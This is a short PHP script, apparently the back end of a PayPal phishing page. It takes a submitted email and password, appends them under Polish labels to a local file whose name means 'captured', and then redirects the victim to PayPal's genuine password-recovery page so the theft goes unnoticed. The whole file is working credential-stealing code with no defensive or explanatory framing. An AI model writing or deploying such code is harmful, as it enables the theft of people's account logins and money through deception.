<?php

file_put_contents("przechwycone.txt", " Login: " . $_POST['login_email'] . " Hasło: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>